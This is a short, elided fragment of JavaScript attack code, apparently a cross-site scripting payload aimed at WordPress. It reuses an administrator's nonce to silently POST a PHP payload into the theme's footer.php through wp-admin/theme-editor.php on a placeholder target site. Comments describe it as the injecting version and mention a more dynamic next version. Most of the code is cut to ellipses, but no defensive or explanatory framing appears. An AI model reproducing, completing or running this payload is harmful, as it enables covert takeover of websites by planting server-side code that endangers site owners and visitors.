...
// -- This version injects into the footer.php theme file
//
// Compatibility Notes:
...
function silent_themes_inject() {
   ...
   // Create a variable which holds the current theme data, a new line (Windows format), and then our php payload
   ...
   formData.append("_wpnonce", themes_wpnonce);
   ...
   request.open("POST", "http://TARGETWEBSITE/wp-admin/theme-editor.php"); // This variable needs to be dynamic in the next version.
